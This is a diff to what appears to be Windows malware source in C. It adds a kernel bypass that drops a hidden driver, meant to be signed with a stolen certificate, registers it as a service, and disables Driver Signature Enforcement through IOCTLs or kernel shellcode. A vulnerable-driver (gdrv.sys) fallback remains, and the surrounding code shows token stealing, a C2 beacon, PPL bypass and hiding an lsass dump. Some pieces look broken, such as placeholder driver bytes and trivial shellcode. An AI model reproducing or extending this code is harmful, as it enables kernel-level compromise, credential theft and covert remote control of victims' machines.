@@ -669,7 +669,178 @@ DWORD WINAPI BeaconThread(LPVOID lpParam) {
     return 0;
 }
 
-// ==================== KERNEL BYPASS ====================
+// ==================== KERNEL BYPASS - CUSTOM SIGNED DRIVER ====================
+// Embedded custom kernel driver payload (base64 encoded placeholder)
+// Replace with your own compiled driver signed with stolen certificate
+CHAR g_customDriverBase64[] = 
+    "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA................................"; // REPLACE WITH ACTUAL BASE64 ENCODED DRIVER
+
+// Function to decode base64 embedded driver
+BOOL DecodeBase64Driver(BYTE** output, DWORD* outputSize) {
+    DWORD base64Len = strlen(g_customDriverBase64);
+    DWORD decodedLen = 0;
+    
+    // Calculate decoded length
+    if (!CryptStringToBinaryA(g_customDriverBase64, base64Len, CRYPT_STRING_BASE64,
+                              NULL, &decodedLen, NULL, NULL)) {
+        return FALSE;
+    }
+    
+    *output = (BYTE*)malloc(decodedLen);
+    if (!*output) return FALSE;
+    
+    if (!CryptStringToBinaryA(g_customDriverBase64, base64Len, CRYPT_STRING_BASE64,
+                              *output, &decodedLen, NULL, NULL)) {
+        free(*output);
+        return FALSE;
+    }
+    
+    *outputSize = decodedLen;
+    return TRUE;
+}
+
+// Write custom driver to disk
+BOOL WriteCustomDriver(LPCWSTR driverPath) {
+    BYTE* driverData = NULL;
+    DWORD driverSize = 0;
+    
+    if (!DecodeBase64Driver(&driverData, &driverSize)) {
+        return FALSE;
+    }
+    
+    HANDLE hFile = CreateFileW(driverPath, GENERIC_WRITE, 0, NULL,
+                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        free(driverData);
+        return FALSE;
+    }
+    
+    DWORD bytesWritten;
+    WriteFile(hFile, driverData, driverSize, &bytesWritten, NULL);
+    CloseHandle(hFile);
+    free(driverData);
+    
+    return (bytesWritten == driverSize);
+}
+
+// Load and start custom signed driver
+BOOL LoadCustomDriver() {
+    const wchar_t* driverPath = L"C:\\Windows\\Temp\\church_driver.sys";
+    
+    // Write embedded driver to disk
+    if (!WriteCustomDriver(driverPath)) {
+        return FALSE;
+    }
+    
+    // Set file attributes to hide
+    SetFileAttributesW(driverPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    
+    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!scm) return FALSE;
+    
+    // Create service for the driver
+    SC_HANDLE svc = CreateServiceW(scm, L"ChurchDriver", L"Church Security Driver",
+                                   SERVICE_START | SERVICE_STOP | DELETE,
+                                   SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
+                                   SERVICE_ERROR_IGNORE, driverPath,
+                                   NULL, NULL, NULL, NULL, NULL);
+    if (!svc && GetLastError() == ERROR_SERVICE_EXISTS) {
+        svc = OpenServiceW(scm, L"ChurchDriver", SERVICE_START | SERVICE_STOP | DELETE);
+    }
+    
+    if (!svc) {
+        CloseServiceHandle(scm);
+        return FALSE;
+    }
+    
+    // Start the driver
+    if (!StartServiceW(svc, 0, NULL)) {
+        DWORD err = GetLastError();
+        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
+            DeleteService(svc);
+            CloseServiceHandle(svc);
+            CloseServiceHandle(scm);
+            return FALSE;
+        }
+    }
+    
+    CloseServiceHandle(svc);
+    CloseServiceHandle(scm);
+    return TRUE;
+}
+
+// Communicate with custom driver to disable DSE
+BOOL DisableDSEviaCustomDriver() {
+    HANDLE hDevice = CreateFileW(L"\\\\.\\ChurchDriver", GENERIC_READ | GENERIC_WRITE,
+                                 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        // Try alternative device name
+        hDevice = CreateFileW(L"\\\\.\\Global\\ChurchDriver", GENERIC_READ | GENERIC_WRITE,
+                             0, NULL, OPEN_EXISTING, 0, NULL);
+        if (hDevice == INVALID_HANDLE_VALUE) {
+            return FALSE;
+        }
+    }
+    
+    DWORD bytesReturned;
+    LPVOID kernelBase = GetModuleHandleW(L"ntoskrnl.exe");
+    if (!kernelBase) {
+        CloseHandle(hDevice);
+        return FALSE;
+    }
+    
+    // Find CiOptions in ntoskrnl.exe via signature
+    BYTE pattern[] = { 0x8A, 0x05, 0x00, 0x00, 0x00, 0x00, 0xC3 };
+    ULONGLONG ciOptionsAddr = FindPattern((BYTE*)kernelBase, 0x2000000, pattern, sizeof(pattern));
+    
+    if (ciOptionsAddr) {
+        // Extract the actual address from the pattern
+        DWORD* relAddr = (DWORD*)(ciOptionsAddr + 2);
+        ULONGLONG targetAddr = ciOptionsAddr + 6 + *relAddr;
+        
+        // Send IOCTL to driver to patch DSE
+        #define CHURCH_IOCTL_DISABLE_DSE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+        
+        BYTE newValue = CI_OPTIONS_DISABLE_DSE;
+        if (DeviceIoControl(hDevice, CHURCH_IOCTL_DISABLE_DSE,
+                           &targetAddr, sizeof(targetAddr),
+                           &newValue, sizeof(newValue),
+                           &bytesReturned, NULL)) {
+            CloseHandle(hDevice);
+            return TRUE;
+        }
+    }
+    
+    CloseHandle(hDevice);
+    return FALSE;
+}
+
+// Alternative: Use direct kernel shellcode injection via driver
+BOOL DisableDSEviaShellcode() {
+    HANDLE hDevice = CreateFileW(L"\\\\.\\ChurchDriver", GENERIC_READ | GENERIC_WRITE,
+                                 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;
+    
+    // Shellcode to disable DSE by patching nt!g_CiOptions
+    BYTE shellcode[] = {
+        0x48, 0x31, 0xC0,                    // xor rax, rax
+        0xB0, 0x06,                          // mov al, 0x6 (CI_OPTIONS_DISABLE_DSE)
+        0xC3                                 // ret
+    };
+    
+    DWORD bytesReturned;
+    #define CHURCH_IOCTL_EXECUTE_SHELLCODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
+    
+    BOOL result = DeviceIoControl(hDevice, CHURCH_IOCTL_EXECUTE_SHELLCODE,
+                                  shellcode, sizeof(shellcode),
+                                  NULL, 0,
+                                  &bytesReturned, NULL);
+    
+    CloseHandle(hDevice);
+    return result;
+}
+
+// Original gdrv functions kept as fallback
 BOOL LoadGdrvDriver() {
     if (!CopyFileW(L"gdrv.sys", L"C:\\Windows\\Temp\\gdrv.sys", FALSE)) return FALSE;
     SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
@@ -681,21 +852,6 @@ BOOL LoadGdrvDriver() {
     CloseServiceHandle(svc);
     CloseServiceHandle(scm);
     return TRUE;
-}
-
-ULONGLONG FindPattern(BYTE* base, DWORD size, BYTE* pattern, DWORD patternLen) {
-    for (DWORD i = 0; i < size - patternLen; i++) {
-        BOOL found = TRUE;
-        for (DWORD j = 0; j < patternLen; j++) {
-            if (pattern[j] != 0x00 && base[i + j] != pattern[j]) { found = FALSE; break; }
-        }
-        if (found) return (ULONGLONG)(base + i);
-    }
-    return 0;
-}
-
-ULONGLONG WalkPageTable(PVOID virtualAddr) {
-    return (ULONGLONG)virtualAddr;
 }
 
 BOOL DisableDSEviaGdrv() {
@@ -720,11 +876,43 @@ BOOL DisableDSEviaGdrv() {
     return TRUE;
 }
 
+// Main kernel execution function - uses custom signed driver with fallback
 BOOL EnableKernelExecution() {
+    // First attempt to load custom signed driver
+    if (LoadCustomDriver()) {
+        Sleep(2000);
+        
+        // Try to disable DSE via custom driver IOCTL
+        if (DisableDSEviaCustomDriver()) {
+            return TRUE;
+        }
+        
+        // Try alternative shellcode method
+        if (DisableDSEviaShellcode()) {
+            return TRUE;
+        }
+    }
+    
+    // Fallback to BYOVD if custom driver fails
     if (!LoadGdrvDriver()) return FALSE;
     Sleep(2000);
     if (!DisableDSEviaGdrv()) return FALSE;
     return TRUE;
+}
+
+ULONGLONG FindPattern(BYTE* base, DWORD size, BYTE* pattern, DWORD patternLen) {
+    for (DWORD i = 0; i < size - patternLen; i++) {
+        BOOL found = TRUE;
+        for (DWORD j = 0; j < patternLen; j++) {
+            if (pattern[j] != 0x00 && base[i + j] != pattern[j]) { found = FALSE; break; }
+        }
+        if (found) return (ULONGLONG)(base + i);
+    }
+    return 0;
+}
+
+ULONGLONG WalkPageTable(PVOID virtualAddr) {
+    return (ULONGLONG)virtualAddr;
 }
 
 // ==================== PPL BYPASS ====================
@@ -1297,7 +1485,7 @@ int main() {
     EnableKernelExecution();
     RunAsPPL();
     TokenStealing();
-    NetworkC2Setup();  // THIS STARTS THE C2 BEACON - FULLY INTEGRATED
+    NetworkC2Setup();
     HideFile(L"C:\\lsass.dmp");
     return 0;
 }
